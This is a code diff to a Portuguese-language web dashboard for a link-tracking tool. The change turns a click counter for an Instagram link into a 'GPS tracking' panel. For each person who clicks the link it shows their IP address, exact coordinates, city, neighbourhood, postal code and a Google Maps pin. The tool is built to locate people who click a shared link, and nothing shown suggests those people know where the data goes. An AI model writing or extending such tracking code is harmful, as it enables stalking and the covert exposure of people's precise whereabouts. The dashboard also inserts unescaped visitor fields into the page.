@@ -49,8 +49,21 @@
             margin-bottom: 15px;
             border-radius: 5px;
         }
+        .click-item.gps-enabled {
+            border-left-color: #28a745;
+            background: #f0fff4;
+        }
         .click-time { font-weight: bold; color: #667eea; margin-bottom: 5px; }
         .click-info { color: #666; font-size: 0.9em; margin: 3px 0; }
+        .gps-location {
+            background: #28a745;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 5px;
+            font-weight: bold;
+        }
         .refresh-btn {
             background: #667eea;
             color: white;
@@ -82,8 +95,8 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>📊 Dashboard de Rastreamento</h1>
-            <p>Monitore quem clica no seu link do Instagram</p>
+            <h1>📊 Dashboard de Rastreamento GPS</h1>
+            <p>Monitore quem clica no seu link com localização precisa</p>
             <div class="link-box">
                 <strong>🔗 Seu link de rastreamento:</strong><br>
                 <code id="trackingLink">Carregando...</code>
@@ -95,8 +108,8 @@
                 <div class="stat-label">Total de Cliques</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" id="todayClicks">0</div>
-                <div class="stat-label">Cliques Hoje</div>
+                <div class="stat-number" id="gpsClicks">0</div>
+                <div class="stat-label">Com GPS</div>
             </div>
             <div class="stat-card">
                 <div class="stat-number" id="uniqueVisitors">0</div>
@@ -116,10 +129,12 @@
         async function loadClicks() {
             const response = await fetch('/api/clicks');
             const clicks = await response.json();
+            
             document.getElementById('totalClicks').textContent = clicks.length;
-            const today = new Date().toDateString();
-            const todayClicks = clicks.filter(c => new Date(c.timestamp).toDateString() === today);
-            document.getElementById('todayClicks').textContent = todayClicks.length;
+            
+            const gpsClicks = clicks.filter(c => c.gpsLocation && c.gpsLocation.city !== 'Desconhecida');
+            document.getElementById('gpsClicks').textContent = gpsClicks.length;
+            
             const uniqueIPs = new Set(clicks.map(c => c.ip));
             document.getElementById('uniqueVisitors').textContent = uniqueIPs.size;
             
@@ -128,12 +143,34 @@
                 container.innerHTML = '<p>📭 Nenhum clique ainda</p>';
                 return;
             }
+            
             container.innerHTML = clicks.reverse().map(c => {
                 const date = new Date(c.timestamp).toLocaleString('pt-BR');
                 const isIG = c.userAgent.toLowerCase().includes('instagram');
-                return `<div class="click-item">
+                const hasGPS = c.gpsLocation && c.gpsLocation.city !== 'Desconhecida';
+                const itemClass = hasGPS ? 'click-item gps-enabled' : 'click-item';
+                
+                let locationHTML = '';
+                if (hasGPS) {
+                    const gps = c.gpsLocation;
+                    locationHTML = `
+                        <div class="gps-location">
+                            📍 LOCALIZAÇÃO GPS EXATA
+                        </div>
+                        <div class="click-info">🏙️ Cidade: ${gps.city}, ${gps.state}, ${gps.country}</div>
+                        ${gps.neighborhood ? `<div class="click-info">🏘️ Bairro: ${gps.neighborhood}</div>` : ''}
+                        ${gps.postalCode ? `<div class="click-info">📮 CEP: ${gps.postalCode}</div>` : ''}
+                        <div class="click-info">🗺️ Coordenadas: ${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}</div>
+                        <div class="click-info">📍 <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}" target="_blank">Ver no Google Maps</a></div>
+                    `;
+                } else {
+                    locationHTML = `<div class="click-info">⚠️ GPS não autorizado (localização por IP imprecisa)</div>`;
+                }
+                
+                return `<div class="${itemClass}">
                     <div class="click-time">⏰ ${date}</div>
                     <div class="click-info">🌐 IP: ${c.ip}</div>
+                    ${locationHTML}
                     <div class="click-info">🔗 Origem: ${c.referer}</div>
                     ${isIG ? '<div class="click-info">✅ Do Instagram!</div>' : ''}
                 </div>`;
